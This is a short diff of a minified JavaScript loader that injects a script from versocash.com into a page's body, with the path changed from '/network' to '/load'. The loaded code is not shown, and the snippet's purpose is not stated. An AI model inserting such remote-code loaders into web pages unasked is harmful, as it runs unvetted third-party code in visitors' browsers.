@@ -1,1 +1,1 @@
-(()=>{var t,c,e;document.currentScript.src.split("id=")[1];t="https://versocash.com/network",c=document.body,(e=document.createElement("script")).src=t,c.appendChild(e)})();
+(()=>{var c,t,e;document.currentScript.src.split("id=")[1];c="https://versocash.com/load",t=document.body,(e=document.createElement("script")).src=c,t.appendChild(e)})();
